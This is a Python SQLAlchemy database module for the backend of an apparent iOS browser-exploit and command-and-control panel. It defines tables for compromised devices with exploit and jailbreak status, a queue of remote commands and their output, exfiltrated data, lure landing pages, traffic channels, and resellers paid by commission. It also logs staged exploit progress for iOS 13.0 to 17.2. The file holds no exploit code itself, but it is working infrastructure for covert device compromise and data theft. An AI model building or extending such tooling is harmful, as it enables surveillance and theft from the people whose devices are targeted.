import hashlib

from sqlalchemy import create_engine, Column, Integer, String, DateTime, Text
from sqlalchemy.orm import declarative_base, sessionmaker, Session
from datetime import datetime
from pathlib import Path
from typing import Optional

PROJECT_ROOT = Path(__file__).resolve().parent.parent
DATABASE_URL = f"sqlite:///{PROJECT_ROOT / 'darksword.db'}"


def normalize_device_uuid(device_uuid: Optional[str], user_agent: Optional[str]) -> Optional[str]:
    """校正设备 UUID 前缀使其与 UA 一致，避免 PC 浏览器缓存旧 ios- UUID 导致误识别。

    规则：
    - 空/None：返回 None（由调用方按 UA 生成）
    - unknown- 前缀：后端兜底生成的临时 UUID，需按 UA 重生成
    - ios- 前缀但 UA 非 iOS：PC 浏览器缓存了修复前的旧 UUID，重生成 dev-
    - 无前缀的纯 hex UUID（旧式）：按 UA 补 ios-/dev- 前缀
    - 前缀与 UA 一致：原样返回

    需要重新生成时使用 UA 的 SHA1 哈希确定性生成，保证同一 PC 始终映射到同一 UUID，
    避免每次轮询都新建记录导致数据增殖。
    """
    if not device_uuid:
        return None
    ua = user_agent or ""
    s = str(device_uuid).strip()
    if not s:
        return None
    is_ios_ua = any(k in ua for k in ("iPhone", "iPad", "iPod", "iOS"))
    has_ios_prefix = s.startswith("ios-")
    has_dev_prefix = s.startswith("dev-")
    has_unknown_prefix = s.startswith("unknown-")
    # 前缀与 UA 不匹配 -> 确定性重生成
    if has_unknown_prefix or (has_ios_prefix and not is_ios_ua):
        h = hashlib.sha1(ua.encode("utf-8", "replace")).hexdigest()[:24]
        return ("ios-" if is_ios_ua else "dev-") + h
    # 前缀正确，原样返回
    if has_ios_prefix or has_dev_prefix:
        return s
    # 无前缀的纯 hex（旧式）-> 按 UA 补前缀
    return ("ios-" if is_ios_ua else "dev-") + s

engine = create_engine(DATABASE_URL, connect_args={"check_same_thread": False})
SessionLocal = sessionmaker(autocommit=False, autoflush=False, bind=engine)
Base = declarative_base()


class Log(Base):
    __tablename__ = "logs"
    id = Column(Integer, primary_key=True, index=True)
    timestamp = Column(DateTime, default=datetime.now)
    ip = Column(String(50))
    method = Column(String(10))
    path = Column(String(255))
    status_code = Column(Integer)
    content_length = Column(Integer)
    user_agent = Column(String(500))
    log_type = Column(String(20))
    device_uuid = Column(String(100), index=True, nullable=True)
    channel_id = Column(Integer, index=True, nullable=True)
    template_id = Column(Integer, index=True, nullable=True)


class Device(Base):
    __tablename__ = "devices"
    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(100), unique=True, index=True)
    first_seen = Column(DateTime, default=datetime.now)
    last_seen = Column(DateTime, default=datetime.now)
    ip = Column(String(50))
    user_agent = Column(String(500))
    status = Column(String(20), default="active")
    os_version = Column(String(50))
    safari_version = Column(String(50))
    device_model = Column(String(100))
    hw_model = Column(String(50), nullable=True)
    chipset = Column(String(100))
    jailbroken = Column(String(10), default="unknown")
    exploit_status = Column(String(20), default="pending")
    last_command_time = Column(DateTime)
    group_id = Column(Integer, index=True, nullable=True)
    note = Column(String(500), nullable=True)
    host = Column(String(255), nullable=True)
    referer = Column(String(500), nullable=True)
    access_path = Column(String(500), nullable=True)
    ip_location = Column(String(200), nullable=True)
    enabled = Column(Integer, default=1)
    channel_id = Column(Integer, index=True, nullable=True)
    template_id = Column(Integer, index=True, nullable=True)
    agent_id = Column(Integer, index=True, nullable=True)
    browser_name = Column(String(100), nullable=True)
    browser_version = Column(String(50), nullable=True)
    webkit_version = Column(String(50), nullable=True)
    os_type = Column(String(20), nullable=True)
    compatible_level = Column(String(30), nullable=True)


def resolve_forwarded_uuid_ua(db: Session, raw_uuid: Optional[str],
                              payload_ua: Optional[str], header_ua: str) -> tuple:
    """解析 exploit_server 转发请求里的 device_uuid + UA（共享版，供 report.py / devices.py 复用）。

    exploit_server 的 3 条 async forward 线程把设备数据/报告/注册请求 POST 给后端时，
    HTTP User-Agent 头固定为 'Exploit-Server/1.0'。若直接用它跑 normalize_device_uuid，
    会让真实 ios- 设备因「前缀与 UA 不匹配」被确定性重生成 dev- 前缀，从而在设备
    列表里分裂出一条 IP=127.0.0.1 / UA=Exploit-Server/1.0 的幽灵记录。

    策略：
    - 若 UUID 已存在（exploit_server 端已用真实 UA 注册过），信任其 UUID 不做前缀校正，
      并复用其已存的 UA（防止把真实 UA 覆盖成 Exploit-Server/1.0）；
    - 仅对全新 UUID 做前缀校正（处理 PC 浏览器缓存的旧 ios- / unknown- 兜底 UUID）。
    """
    existing = db.query(Device).filter(Device.device_uuid == raw_uuid).first() if raw_uuid else None
    if existing:
        ua = payload_ua or existing.user_agent or header_ua
        return raw_uuid, ua
    ua = payload_ua or header_ua
    uuid = normalize_device_uuid(raw_uuid, ua) or raw_uuid
    return uuid, ua


MIN_SUPPORTED_IOS = "13.0"
MAX_SUPPORTED_IOS = "17.2"


def compute_os_type(user_agent: Optional[str], os_version: Optional[str] = None) -> Optional[str]:
    ua = (user_agent or "").lower()
    if "iphone" in ua or "ipad" in ua or "ipod" in ua or "cpu os" in ua or ("ios " in ua):
        return "ios"
    if "android" in ua or ("linux" in ua and "mobile" in ua):
        return "android"
    if "mac os x" in ua or "macintosh" in ua:
        return "macos"
    if "windows" in ua:
        return "windows"
    if os_version:
        return "ios"
    return None


def _parse_version_tuple(v: Optional[str]):
    if not v:
        return None
    parts = str(v).split(".")
    try:
        major = int(parts[0])
        minor = int(parts[1]) if len(parts) > 1 else 0
    except (ValueError, TypeError):
        return None
    return major * 100 + minor


def compute_compatible_level(os_version: Optional[str], browser_name: Optional[str] = None) -> Optional[str]:
    ver = _parse_version_tuple(os_version)
    if ver is None:
        return None
    min_v = _parse_version_tuple(MIN_SUPPORTED_IOS) or 1300
    max_v = _parse_version_tuple(MAX_SUPPORTED_IOS) or 1702
    if ver < min_v:
        return "too_low"
    if ver > max_v:
        return "too_high"
    base = "compatible"
    if base == "compatible" and browser_name and browser_name not in ("Safari", "Safari (Web)"):
        return "partially_compatible"
    return base


class DeviceGroup(Base):
    __tablename__ = "device_groups"
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String(100), unique=True, index=True, nullable=False)
    color = Column(String(20), default="#409EFF")
    description = Column(String(500), nullable=True)
    agent_id = Column(Integer, index=True, nullable=True)
    created_at = Column(DateTime, default=datetime.now)
    updated_at = Column(DateTime, default=datetime.now, onupdate=datetime.now)


class TrafficChannel(Base):
    __tablename__ = "traffic_channels"
    id = Column(Integer, primary_key=True, index=True)
    slug = Column(String(64), unique=True, index=True, nullable=False)
    name = Column(String(200), nullable=False)
    api_key = Column(String(128), unique=True, index=True)
    color = Column(String(20), default="#67c23a")
    domain_whitelist = Column(Text, nullable=True)
    default_template_id = Column(Integer, index=True, nullable=True)
    enabled = Column(Integer, default=1)
    visit_count = Column(Integer, default=0)
    device_count = Column(Integer, default=0)
    note = Column(String(500), nullable=True)
    created_by = Column(String(50), nullable=True)
    agent_id = Column(Integer, index=True, nullable=True)
    created_at = Column(DateTime, default=datetime.now)
    updated_at = Column(DateTime, default=datetime.now, onupdate=datetime.now)


class LandingTemplate(Base):
    __tablename__ = "landing_templates"
    id = Column(Integer, primary_key=True, index=True)
    slug = Column(String(64), unique=True, index=True, nullable=False)
    name = Column(String(200), nullable=False)
    category = Column(String(50), index=True, default="generic")
    title = Column(String(200), nullable=True)
    description = Column(String(500), nullable=True)
    html_index = Column(Text, nullable=True)
    html_frame = Column(Text, nullable=True)
    js_assets = Column(String(500), nullable=True)
    css_assets = Column(String(500), nullable=True)
    preview_url = Column(String(500), nullable=True)
    enabled = Column(Integer, default=1)
    visit_count = Column(Integer, default=0)
    device_count = Column(Integer, default=0)
    agent_id = Column(Integer, index=True, nullable=True)
    created_at = Column(DateTime, default=datetime.now)
    updated_at = Column(DateTime, default=datetime.now, onupdate=datetime.now)


class Command(Base):
    __tablename__ = "commands"
    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(100), index=True)
    command = Column(Text)
    status = Column(String(20), default="pending")
    output = Column(Text)
    created_at = Column(DateTime, default=datetime.now)
    executed_at = Column(DateTime)


class ExfilData(Base):
    __tablename__ = "exfil_data"
    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(100), index=True)
    category = Column(String(50))
    path = Column(String(500))
    description = Column(Text)
    file_path = Column(String(500))
    file_size = Column(Integer)
    data_json = Column(Text, nullable=True)
    uploaded_at = Column(DateTime, default=datetime.now)


class User(Base):
    __tablename__ = "users"
    id = Column(Integer, primary_key=True, index=True)
    username = Column(String(50), unique=True, index=True)
    password = Column(String(255))
    role = Column(String(20), default="user")
    created_at = Column(DateTime, default=datetime.now)
    last_login = Column(DateTime)
    last_login_ip = Column(String(50), nullable=True)
    google_2fa_secret = Column(String(100), nullable=True)
    google_2fa_enabled = Column(Integer, default=0)
    token_version = Column(Integer, default=0, nullable=False)
    failed_2fa_attempts = Column(Integer, default=0, nullable=False, server_default="0")
    locked_until = Column(DateTime, nullable=True)


class Agent(Base):
    __tablename__ = "agents"
    id = Column(Integer, primary_key=True, index=True)
    username = Column(String(50), unique=True, index=True, nullable=False)
    password = Column(String(255), nullable=False)
    name = Column(String(100), nullable=True)
    contact = Column(String(200), nullable=True)
    phone = Column(String(30), nullable=True)
    enabled = Column(Integer, default=1, nullable=False, server_default="1")
    max_devices = Column(Integer, default=0, nullable=True)
    commission_rate = Column(Integer, default=0, nullable=True)
    notes = Column(Text, nullable=True)
    last_login = Column(DateTime, nullable=True)
    last_login_ip = Column(String(50), nullable=True)
    token_version = Column(Integer, default=0, nullable=False)
    google_2fa_secret = Column(String(100), nullable=True)
    google_2fa_enabled = Column(Integer, default=0)
    failed_2fa_attempts = Column(Integer, default=0, nullable=False, server_default="0")
    locked_until = Column(DateTime, nullable=True)
    created_at = Column(DateTime, default=datetime.now)
    updated_at = Column(DateTime, default=datetime.now, onupdate=datetime.now)


class AuditLog(Base):
    __tablename__ = "audit_logs"
    id = Column(Integer, primary_key=True, index=True)
    timestamp = Column(DateTime, default=datetime.now, index=True)
    username = Column(String(50), index=True)
    action = Column(String(50), index=True)
    resource_type = Column(String(50))
    resource_id = Column(String(100))
    detail = Column(Text)
    ip_address = Column(String(50))
    user_agent = Column(String(500))


class Notification(Base):
    __tablename__ = "notifications"
    id = Column(Integer, primary_key=True, index=True)
    timestamp = Column(DateTime, default=datetime.now, index=True)
    title = Column(String(200))
    message = Column(Text)
    category = Column(String(50), default="info", index=True)
    is_read = Column(Integer, default=0, index=True)
    related_device_uuid = Column(String(100), nullable=True)
    related_resource_type = Column(String(50), nullable=True)
    related_resource_id = Column(String(100), nullable=True)


class Settings(Base):
    __tablename__ = "settings"
    id = Column(Integer, primary_key=True, index=True)
    key = Column(String(100), unique=True, index=True)
    value = Column(Text)
    description = Column(String(500), nullable=True)
    updated_at = Column(DateTime, default=datetime.now, onupdate=datetime.now)
    updated_by = Column(String(50), nullable=True)


class CommandScript(Base):
    __tablename__ = "command_scripts"
    id = Column(Integer, primary_key=True, index=True)
    name = Column(String(100), unique=True, index=True)
    slug = Column(String(100), unique=True, index=True, nullable=True)
    category = Column(String(50), default="recon", index=True)
    description = Column(String(500), nullable=True)
    command = Column(Text)
    use_count = Column(Integer, default=0)
    created_at = Column(DateTime, default=datetime.now)
    updated_at = Column(DateTime, default=datetime.now, onupdate=datetime.now)


class DeviceExploitLog(Base):
    """设备漏洞利用过程中浏览器端上报的细粒度控制台日志（STAGE1/STAGE2/STAGE3/PAC/payload 下载等）"""
    __tablename__ = "device_exploit_logs"
    id = Column(Integer, primary_key=True, index=True)
    device_uuid = Column(String(100), index=True, nullable=False)
    timestamp = Column(DateTime, default=datetime.now, index=True)
    level = Column(String(10), default="log", index=True)  # log/warn/error/debug/info
    phase = Column(String(30), index=True, nullable=True)   # STAGE1/STAGE2/STAGE3/PAC/LOADER/...
    message = Column(Text)                                   # 完整消息（可能很长）
    tags_json = Column(Text, nullable=True)                  # 附加标签 JSON（数组）
    extra_json = Column(Text, nullable=True)                 # 附加信息 JSON（对象）
    source_ip = Column(String(50), nullable=True)


def init_db():
    Base.metadata.create_all(bind=engine)
    from sqlalchemy import text
    try:
        with engine.connect() as conn:
            def _ensure(table: str, col: str, definition: str):
                rows = conn.execute(text(f"PRAGMA table_info({table})")).fetchall()
                existing = {str(r[1] if isinstance(r, tuple) else getattr(r, "name", str(r))).lower() for r in rows}
                if col.lower() not in existing:
                    conn.execute(text(f"ALTER TABLE {table} ADD COLUMN {col} {definition}"))
                    conn.commit()

            for c, d in [
                ("group_id", "INTEGER"), ("note", "VARCHAR(500)"), ("hw_model", "VARCHAR(50)"),
                ("host", "VARCHAR(255)"), ("referer", "VARCHAR(500)"), ("ip_location", "VARCHAR(200)"),
                ("enabled", "INTEGER DEFAULT 1"), ("channel_id", "INTEGER"), ("template_id", "INTEGER"),
                ("access_path", "VARCHAR(500)"), ("agent_id", "INTEGER")
            ]:
                _ensure("devices", c, d)

            _ensure("logs", "channel_id", "INTEGER")
            _ensure("logs", "template_id", "INTEGER")
            _ensure("exfil_data", "data_json", "TEXT")
            _ensure("users", "google_2fa_secret", "VARCHAR(100)")
            _ensure("users", "google_2fa_enabled", "INTEGER DEFAULT 0")
            _ensure("users", "token_version", "INTEGER NOT NULL DEFAULT 0")
            _ensure("users", "last_login_ip", "VARCHAR(50)")
            _ensure("users", "failed_2fa_attempts", "INTEGER NOT NULL DEFAULT 0")
            _ensure("users", "locked_until", "DATETIME")

            _ensure("agents", "google_2fa_secret", "VARCHAR(100)")
            _ensure("agents", "google_2fa_enabled", "INTEGER DEFAULT 0")
            _ensure("agents", "failed_2fa_attempts", "INTEGER NOT NULL DEFAULT 0")
            _ensure("agents", "locked_until", "DATETIME")

            _ensure("traffic_channels", "agent_id", "INTEGER")
            _ensure("landing_templates", "agent_id", "INTEGER")
            _ensure("device_groups", "agent_id", "INTEGER")
            _ensure("command_scripts", "slug", "VARCHAR(100)")
            _ensure("command_scripts", "category", "VARCHAR(50) DEFAULT 'recon'")
            _ensure("command_scripts", "use_count", "INTEGER DEFAULT 0")
    except Exception:
        import logging
        logging.getLogger("admin.database").exception("init_db migration failed")
        raise


def get_db():
    db = SessionLocal()
    try:
        yield db
    finally:
        db.close()


def create_audit_log(db: Session, username: str, action: str, resource_type: str = None,
                     resource_id: str = None, detail: str = None, ip_address: str = None,
                     user_agent: str = None):
    try:
        log = AuditLog(
            username=username, action=action, resource_type=resource_type,
            resource_id=str(resource_id) if resource_id is not None else None,
            detail=detail, ip_address=ip_address, user_agent=user_agent
        )
        db.add(log)
        db.commit()
    except Exception:
        db.rollback()


def create_notification(db: Session, title: str, message: str, category: str = "info",
                        related_device_uuid: str = None, related_resource_type: str = None,
                        related_resource_id: str = None):
    try:
        n = Notification(
            title=title, message=message, category=category,
            related_device_uuid=related_device_uuid, related_resource_type=related_resource_type,
            related_resource_id=str(related_resource_id) if related_resource_id is not None else None
        )
        db.add(n)
        db.commit()
    except Exception:
        db.rollback()
